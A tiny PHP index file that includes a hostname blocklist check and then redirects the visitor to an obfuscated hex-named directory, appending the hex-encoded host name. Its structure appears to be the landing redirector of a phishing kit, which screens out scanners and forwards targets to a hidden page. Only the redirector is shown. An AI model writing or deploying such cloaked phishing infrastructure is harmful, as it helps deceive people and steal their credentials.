<?php
/*
* index.php
*/




//Call Log Files
require_once '44e50d6b66fba750c967c2977131f004/_data_/hostname_check.php'; // Check if hostname contain blocked word



$host = bin2hex ($_SERVER['HTTP_HOST']);
$index="44e50d6b66fba750c967c2977131f004/?$host";

header("location: $index");


?>
